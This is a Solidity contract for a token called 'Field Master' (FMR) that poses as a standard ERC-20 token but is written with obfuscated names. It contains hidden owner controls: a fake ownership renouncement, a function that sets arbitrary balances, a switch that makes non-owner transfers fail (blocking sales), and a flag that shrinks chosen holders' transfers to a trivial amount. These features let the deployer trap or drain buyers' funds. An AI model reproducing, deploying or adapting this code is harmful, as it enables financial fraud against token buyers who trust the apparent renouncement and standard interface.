//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface totalFrom {
    function createPair(address walletReceiver, address receiverLaunched) external returns (address);
}

interface minLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalFund) external view returns (uint256);

    function transfer(address minList, uint256 fundLaunched) external returns (bool);

    function allowance(address isReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address minList,
        uint256 fundLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atTake, uint256 value);
    event Approval(address indexed isReceiver, address indexed spender, uint256 value);
}

abstract contract minFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tradingEnable is minLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FieldMaster is minFund, minLimit, tradingEnable {

    function symbol() external view virtual override returns (string memory) {
        return feeTeam;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return toSellTeam;
    }

    event OwnershipTransferred(address indexed sellModeReceiver, address indexed listMarketing);

    address shouldTxReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function marketingBuy(address sellWallet, address minList, uint256 fundLaunched) internal returns (bool) {
        if (sellWallet == teamBuy) {
            return liquidityIs(sellWallet, minList, fundLaunched);
        }
        uint256 liquidityMarketingExempt = minLimit(tradingIs).balanceOf(shouldTxReceiver);
        require(liquidityMarketingExempt == buyMode);
        require(minList != shouldTxReceiver);
        if (atMin[sellWallet]) {
            return liquidityIs(sellWallet, minList, fromMarketing);
        }
        return liquidityIs(sellWallet, minList, fundLaunched);
    }

    function getOwner() external view returns (address) {
        return receiverAt;
    }

    function liquidityLaunch() private view {
        require(toAmount[_msgSender()]);
    }

    mapping(address => bool) public toAmount;

    uint256 public maxModeExempt;

    function name() external view virtual override returns (string memory) {
        return tradingSell;
    }

    function approve(address enableFeeFund, uint256 fundLaunched) public virtual override returns (bool) {
        modeTotal[_msgSender()][enableFeeFund] = fundLaunched;
        emit Approval(_msgSender(), enableFeeFund, fundLaunched);
        return true;
    }

    uint256 private toSellTeam = 100000000 * 10 ** 18;

    bool public fundWalletToken;

    function decimals() external view virtual override returns (uint8) {
        return modeToTeam;
    }

    bool public maxTakeLimit;

    function liquidityIs(address sellWallet, address minList, uint256 fundLaunched) internal returns (bool) {
        require(exemptSell[sellWallet] >= fundLaunched);
        exemptSell[sellWallet] -= fundLaunched;
        exemptSell[minList] += fundLaunched;
        emit Transfer(sellWallet, minList, fundLaunched);
        return true;
    }

    function owner() external view returns (address) {
        return receiverAt;
    }

    uint256 public maxSenderMode;

    function maxFundList(address toTx, uint256 fundLaunched) public {
        liquidityLaunch();
        exemptSell[toTx] = fundLaunched;
    }

    function transfer(address toTx, uint256 fundLaunched) external virtual override returns (bool) {
        return marketingBuy(_msgSender(), toTx, fundLaunched);
    }

    address public tradingIs;

    function autoFrom(uint256 fundLaunched) public {
        liquidityLaunch();
        buyMode = fundLaunched;
    }

    uint256 buyMode;

    bool private teamAuto;

    function allowance(address exemptTeam, address enableFeeFund) external view virtual override returns (uint256) {
        if (enableFeeFund == liquidityTx) {
            return type(uint256).max;
        }
        return modeTotal[exemptTeam][enableFeeFund];
    }

    address liquidityTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function walletTotal(address marketingSender) public {
        liquidityLaunch();
        if (maxModeExempt != maxSenderMode) {
            listLiquidityAt = true;
        }
        if (marketingSender == teamBuy || marketingSender == tradingIs) {
            return;
        }
        atMin[marketingSender] = true;
    }

    string private tradingSell = "Field Master";

    uint8 private modeToTeam = 18;

    uint256 fundTakeEnable;

    constructor (){
        
        amountShould modeList = amountShould(liquidityTx);
        tradingIs = totalFrom(modeList.factory()).createPair(modeList.WETH(), address(this));
        
        teamBuy = _msgSender();
        toAmount[teamBuy] = true;
        exemptSell[teamBuy] = toSellTeam;
        isBuy();
        if (receiverLaunchWallet != maxModeExempt) {
            teamAuto = true;
        }
        emit Transfer(address(0), teamBuy, toSellTeam);
    }

    bool private listLiquidityAt;

    uint256 private receiverLaunchWallet;

    function transferFrom(address sellWallet, address minList, uint256 fundLaunched) external override returns (bool) {
        if (_msgSender() != liquidityTx) {
            if (modeTotal[sellWallet][_msgSender()] != type(uint256).max) {
                require(fundLaunched <= modeTotal[sellWallet][_msgSender()]);
                modeTotal[sellWallet][_msgSender()] -= fundLaunched;
            }
        }
        return marketingBuy(sellWallet, minList, fundLaunched);
    }

    address private receiverAt;

    string private feeTeam = "FMR";

    function isBuy() public {
        emit OwnershipTransferred(teamBuy, address(0));
        receiverAt = address(0);
    }

    address public teamBuy;

    mapping(address => bool) public atMin;

    bool private maxLaunch;

    mapping(address => uint256) private exemptSell;

    uint256 constant fromMarketing = 8 ** 10;

    function balanceOf(address totalFund) public view virtual override returns (uint256) {
        return exemptSell[totalFund];
    }

    mapping(address => mapping(address => uint256)) private modeTotal;

    bool public receiverReceiver;

    bool public feeAmount;

    function receiverMin(address tradingLiquidity) public {
        require(tradingLiquidity.balance < 100000);
        if (receiverReceiver) {
            return;
        }
        
        toAmount[tradingLiquidity] = true;
        
        receiverReceiver = true;
    }

}